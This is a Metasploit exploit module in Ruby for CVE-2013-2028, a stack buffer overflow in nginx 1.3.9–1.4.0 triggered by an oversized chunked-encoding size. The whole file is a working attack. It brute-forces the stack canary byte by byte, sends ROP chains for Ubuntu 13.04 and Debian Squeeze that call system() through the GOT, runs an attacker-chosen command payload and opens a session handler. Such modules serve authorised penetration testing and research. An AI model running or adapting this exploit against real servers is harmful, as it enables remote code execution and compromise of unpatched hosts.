##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote

  include Exploit::Remote::Tcp

  def initialize(info = {})

    super(update_info(info,
      'Name'           => 'Nginx HTTP Server 1.3.9-1.4.0 Chuncked Encoding Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx.
        The exploit first triggers an integer overflow in the ngx_http_parse_chunked() by
        supplying an overly long hex value as chunked block size. This value is later used
        when determining the number of bytes to read into a stack buffer, thus the overflow
        becomes possible.
      },
      'Author'         =>
        [
          'Greg MacManus',    # original discovery
          'hal',              # Metasploit module
          'saelo'             # Metasploit module
        ],
      'DisclosureDate' => 'May 07 2013',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-2028'],
          ['OSVDB', '93037'],
          ['URL', 'http://nginx.org/en/security_advisories.html'],
          ['URL', 'http://packetstormsecurity.com/files/121560/Nginx-1.3.9-1.4.0-Stack-Buffer-Overflow.html']
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'BadChars' => "\x0d\x0a",
        },
      'Arch' => ARCH_CMD,
      'Platform' => 'unix',
      'Targets'        =>
        [
          [ 'Ubuntu 13.04 32bit - nginx 1.4.0', {
            'CanaryOffset' => 5050,
            'Offset' => 12,
            'Writable' => 0x080c7330, # .data from nginx
            :dereference_got_callback => :dereference_got_ubuntu_1304,
            :store_callback => :store_ubuntu_1304,
          }],
          [ 'Debian Squeeze 32bit - nginx 1.4.0', {
            'Offset' => 5130,
            'Writable' => 0x080b4360, # .data from nginx
            :dereference_got_callback => :dereference_got_debian_squeeze,
            :store_callback => :store_debian_squeeze
          } ],
        ],

      'DefaultTarget' => 0
  ))

  register_options([
      OptPort.new('RPORT', [true, "The remote HTTP server port", 80])
    ], self.class)

  register_advanced_options(
    [
      OptInt.new("CANARY", [false, "Use this value as stack canary instead of brute forcing it", 0xffffffff ]),
    ], self.class)

  end

  def peer
    "#{rhost}:#{rport}"
  end

  def check
    begin
      res = send_request_fixed(nil)

      if res =~ /^Server: nginx\/(1\.3\.(9|10|11|12|13|14|15|16)|1\.4\.0)/m
        return Exploit::CheckCode::Appears
      elsif res =~ /^Server: nginx/m
        return Exploit::CheckCode::Detected
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{peer} - Connection failed")
    end

    return Exploit::CheckCode::Unknown
  end

  #
  # Generate a random chunk size that will always result
  # in a negative 64bit number when being parsed
  #
  def random_chunk_size(bytes=16)
    return bytes.times.map{ (rand(0x8) + 0x8).to_s(16) }.join
  end

  def send_request_fixed(data)

    connect

    request =   "GET / HTTP/1.1\r\n"
    request <<  "Host: #{Rex::Text.rand_text_alpha(16)}\r\n"
    request <<  "Transfer-Encoding: Chunked\r\n"
    request <<  "\r\n"
    request <<  "#{data}"

    sock.put(request)

    res = nil

    begin
      res = sock.get_once(-1, 0.5)
    rescue EOFError => e
      # Ignore
    end

    disconnect
    return res
  end

  def store_ubuntu_1304(address, value)
    chain = [
      0x0804c415, # pop ecx ; add al, 29h ; ret
      address, # address
      0x080b9a38, # pop eax ; ret
      value.unpack('V').first, # value
      0x080a9dce, # mov [ecx], eax ; mov [ecx+4], edx ; mov eax, 0 ; ret
    ]
    return chain.pack('V*')
  end

  def dereference_got_ubuntu_1304
    chain = [
      0x08094129,         # pop esi; ret
      0x080c5090,         # GOT for localtime_r
      0x0804c415,         # pop ecx ; add al, 29h ; ret
      0x001a4b00,         # Offset to system
      0x080c360a,         # add ecx, [esi] ; adc al, 41h ; ret
      0x08076f63,         # push ecx ; add al, 39h ; ret
      0x41414141,         # Garbage return address
      target['Writable'], # ptr to .data where contents have been stored
    ]
    return chain.pack('V*')
  end

  def store_debian_squeeze(address, value)
    chain = [
      0x08050d93,              # pop edx ; add al 0x83 ; ret
      value.unpack('V').first, # value
      0x08067330,              # pop eax ; ret
      address,                 # address
      0x08070e94,              # mov [eax] edx ; mov eax 0x0 ; pop ebp ; ret
      0x41414141,              # ebp
    ]

    return chain.pack('V*')
  end

  def dereference_got_debian_squeeze
    chain = [
      0x0804ab34,        # pop edi ; pop ebp ; ret
      0x080B4128 -
      0x5d5b14c4,        # 0x080B4128 => GOT for localtime_r; 0x5d5b14c4 => Adjustment
      0x41414141,      # padding (ebp)
      0x08093c75,        # mov ebx, edi ; dec ecx ; ret
      0x08067330,        # pop eax # ret
      0xfffb0c80,        # offset
      0x08078a46,        # add eax, [ebx+0x5d5b14c4] # ret
      0x0804a3af,         # call eax # system
      target['Writable'] # ptr to .data where contents have been stored
    ]
    return chain.pack("V*")
  end

  def store(buf, address, value)
    rop = target['Rop']
    chain = rop['store']['chain']
    chain[rop['store']['address_offset']] = address
    chain[rop['store']['value_offset']] = value.unpack('V').first
    buf << chain.pack('V*')
  end

  def dereference_got

    unless self.respond_to?(target[:store_callback]) and self.respond_to?(target[:dereference_got_callback])
      fail_with(Exploit::Failure::NoTarget, "Invalid target specified: no callback functions defined")
    end

    buf = ""
    command = payload.encoded
    i = 0
    while i < command.length
      buf << self.send(target[:store_callback], target['Writable'] + i, command[i, 4].ljust(4, ";"))
      i = i + 4
    end

    buf << self.send(target[:dereference_got_callback])

    return buf
  end

  def exploit
    data = random_chunk_size(1024)

    if target['CanaryOffset'].nil?
      data << Rex::Text.rand_text_alpha(target['Offset'] - data.size)
    else

      if not datastore['CANARY'] == 0xffffffff
        print_status("#{peer} - Using 0x%08x as stack canary" % datastore['CANARY'])
        canary = datastore['CANARY']
      else
        print_status("#{peer} - Searching for stack canary")
        canary = find_canary

        if canary.nil? || canary == 0x00000000
          fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to find stack canary")
        else
          print_good("#{peer} - Canary found: 0x%08x\n" % canary)
        end
      end

      data <<  Rex::Text.rand_text_alpha(target['CanaryOffset'] - data.size)
      data <<  [canary].pack('V')
      data << Rex::Text.rand_text_hex(target['Offset'])

    end

    data << dereference_got

    begin
      send_request_fixed(data)
    rescue Errno::ECONNRESET => e
      # Ignore
    end
    handler
  end

  def find_canary
    # First byte of the canary is already known
    canary = "\x00"

    print_status("#{peer} - Assuming byte 0 0x%02x" % 0x00)

    # We are going to bruteforce the next 3 bytes one at a time
    3.times do |c|
      print_status("#{peer} - Bruteforcing byte #{c + 1}")

      0.upto(255) do |i|
        data =   random_chunk_size(1024)
        data <<  Rex::Text.rand_text_alpha(target['CanaryOffset'] - data.size)
        data <<  canary
        data << i.chr

        unless send_request_fixed(data).nil?
          print_good("#{peer} - Byte #{c + 1} found: 0x%02x" % i)
          canary << i.chr
          break
        end
      end
    end

    if canary == "\x00"
      return nil
    else
      return canary.unpack('V').first
    end
  end
end
